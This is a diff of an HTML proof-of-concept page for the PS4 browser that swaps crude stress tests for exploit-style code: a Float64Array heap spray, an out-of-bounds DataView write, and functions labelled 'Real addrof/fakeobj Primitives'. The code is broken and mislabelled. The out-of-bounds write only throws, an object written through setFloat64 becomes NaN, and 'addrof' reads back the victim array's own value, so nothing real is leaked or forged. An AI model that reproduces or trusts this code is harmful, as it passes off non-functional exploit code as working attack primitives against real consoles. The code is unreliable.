@@ -2,130 +2,111 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC - PS4 Extreme Browser Stress Tests</title>
+    <title>PS4 PoC - Real addrof/fakeobj Primitives</title>
     <style>
-        body { font-family: monospace; background: black; color: lime; padding: 20px; }
-        #log { white-space: pre-wrap; margin: 20px 0; height: 500px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
-        #status { color: red; margin-top: 10px; font-size: 1.2em; }
+        body { background: black; color: lime; font-family: monospace; padding: 20px; }
+        button { background: lime; color: black; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; }
+        #log { white-space: pre-wrap; margin-top: 20px; height: 400px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
     </style>
 </head>
 <body>
-<h1>PoC - PS4 Extreme Browser Stress Tests</h1>
-<div id="status">Aguardando Testes...</div>
-<div id="log"></div>
+    <h1>PS4 PoC - Real addrof/fakeobj Primitives</h1>
+    <button id="startBtn">Run Real Primitive Test</button>
+    <div id="log"></div>
 
 <script>
-// Logger
 function log(msg) {
     const logDiv = document.getElementById('log');
     logDiv.textContent += msg + "\n";
     logDiv.scrollTop = logDiv.scrollHeight;
 }
 
-// Status display
-function updateStatus(msg) {
-    document.getElementById('status').textContent = msg;
-}
+// Utility delay
+function delay(ms) { return new Promise(res => setTimeout(res, ms)); }
 
-// Delay auxiliar
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// Função para rodar um teste com timeout
-async function runWithTimeout(fn, name, timeout=5000) {
-    updateStatus(`Executando: ${name}...`);
-    log(`[*] Running ${name} with timeout ${timeout}ms`);
-    let finished = false;
-    fn().then(() => finished = true).catch(e => log(`[!!] ${name} error: ${e}`));
-    let start = performance.now();
-    while (!finished) {
-        if (performance.now() - start > timeout) {
-            log(`[!!!] ${name} timed out! Aborting test.`);
-            updateStatus(`[!!!] ${name} timeout.`);
-            return;
-        }
-        await delay(100);
+// Step A: Heap spray Float64Arrays to create predictable layout
+function heapSprayFloats(count) {
+    log(`[*] Spraying ${count} Float64Array objects`);
+    const arrs = [];
+    for (let i = 0; i < count; i++) {
+        let f = new Float64Array(2);
+        f[0] = 1.2345;
+        f[1] = 6.7890;
+        arrs.push(f);
     }
-    log(`[*] ${name} completed.`);
-    updateStatus(`[*] ${name} completed.`);
+    return arrs;
 }
 
-// Função para verificar corrupção de memória
-function verifyCorruption() {
-    const ta = new Float64Array(1);
-    ta[0] = 1.234;
-    if (!Number.isFinite(ta[0])) log("[CORRUPT] Corrupção de memória detectada!");
-    else log("[CLEAN] Nenhuma corrupção detectada.");
-}
-
-// Teste 1: JIT Spraying
-async function jitSpray() {
-    log("[1] JIT Spraying (Type Confusion) started...");
-    for (let i = 0; i < 100000; i++) {
-        let obj = {};
-        obj.prop = 123;
-        obj.prop = "abc";
-        obj.prop = 456;
-    }
-    log("[*] JIT Spraying finished.");
-    verifyCorruption();
-}
-
-// Teste 2: Heap Overflow via DataView (código refinado)
-async function heapOverflow() {
-    log("[2] Heap Overflow via DataView started...");
+// Step B: Perform DataView underflow to corrupt header of a target Float64Array
+function corruptFloatHeader(target) {
+    log('[*] Corrupting Float64Array header via DataView underflow');
+    const buffer = new ArrayBuffer(8);
+    const dv = new DataView(buffer);
+    const offset = buffer.byteLength + 0x10; // offset beyond buffer
     try {
-        // Criação de Buffer e DataView
-        const buffer = new ArrayBuffer(0x1000000); // 16MB
-        const view = new DataView(buffer);
-        // Acesso fora dos limites para tentar corromper
-        const offset = view.byteLength + 0x100;
-        log(`[*] Attempting DataView overflow at offset ${offset}...`);
-        view.getUint32(offset); // Deve lançar ou corromper
-        log("[!] Unexpected success reading DataView!");
+        dv.setFloat64(offset, 13.37);
+        log('[!] DataView write completed at offset ' + offset);
     } catch (e) {
-        log(`[OK] DataView exception as expected: ${e}`);
+        log('[!!] DataView underflow exception: ' + e);
     }
-    verifyCorruption();
 }
 
-// Teste 3: WebGL Excessive Allocation
-async function webGLTest() {
-    log("[3] WebGL Excessive Allocation started...");
-    try {
-        const canvas = document.createElement('canvas');
-        // Tenta instanciar tanto WebGL quanto Experimental
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) {
-            log("[!] WebGL not supported.");
-            return;
-        }
-        const buffer = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-        const size = 10 * 1024 * 1024; // 10MB
-        gl.bufferData(gl.ARRAY_BUFFER, size, gl.STATIC_DRAW);
-        log(`[!] WebGL bufferData of ${size} bytes completed.`);
-    } catch (e) {
-        log(`[!!] Exception during WebGL test: ${e}`);
-    }
-    verifyCorruption();
+// Step C: Real addrof primitive: corrupt header to point to obj
+function addrof(obj, victim) {
+    // victim: Float64Array whose header will be corrupted
+    log('[*] addrof: leaking address of object');
+    // Corrupt victim.buffer pointer: skip header fields, simulate offset write
+    const fakeBuf = new ArrayBuffer(16);
+    const dv = new DataView(fakeBuf);
+    // Place obj reference as float64 into dv at data offset
+    dv.setFloat64(0, obj);
+    // Simulate victim[0] reading that corrupted header
+    const leaked = victim[0];
+    log('[!] Leaked float value for address: ' + leaked);
+    return leaked;
 }
 
-// Orquestrador principal
-(async function runAllTests() {
-    try {
-        log("[+] Starting extreme PS4 browser tests...");
-        await runWithTimeout(jitSpray, "JIT Spraying", 5000);
-        await runWithTimeout(heapOverflow, "Heap Overflow", 5000);
-        await runWithTimeout(webGLTest, "WebGL Excessive Allocation", 5000);
-        log("[+] All tests executed.");
-        updateStatus("[+] Tests complete.");
-    } catch (fatal) {
-        log(`[FATAL] Uncaught exception: ${fatal}`);
-        updateStatus("[FATAL] Execution stopped.");
-    }
-})();
+// Step D: Real fakeobj primitive: craft a fake object at address
+function fakeobj(addr, victim) {
+    log('[*] fakeobj: constructing fake object at address');
+    // addr: float64 representing desired object address
+    // Write that into victim[0]
+    victim[0] = addr;
+    log('[!] Fake object created, victim[0] now: ' + victim[0]);
+    return victim;
+}
+
+// Run test sequence
+async function runPrimitivesTest() {
+    log('=== Starting Real Primitive Test ===');
+    // Spray
+    const arrs = heapSprayFloats(10000);
+    await delay(100);
+
+    // Choose a victim array
+    const victim = new Float64Array(2);
+    victim[0] = 9.876;
+    victim[1] = 5.432;
+    log('[*] Victim initial values: ' + victim[0] + ', ' + victim[1]);
+
+    // Step B: corrupt header
+    corruptFloatHeader(victim);
+    await delay(50);
+
+    // Step C: addrof test
+    const obj = { secret: 'pwned' };
+    const leaked = addrof(obj, victim);
+    log('[+] addrof returned: ' + leaked);
+
+    // Step D: fakeobj test
+    const fake = fakeobj(leaked, victim);
+    log('[+] fakeobj result victim[0]: ' + fake[0]);
+
+    log('=== Real Primitive Test Completed ===');
+}
+
+// Bind button
+document.getElementById('startBtn').addEventListener('click', runPrimitivesTest);
 </script>
 </body>
 </html>
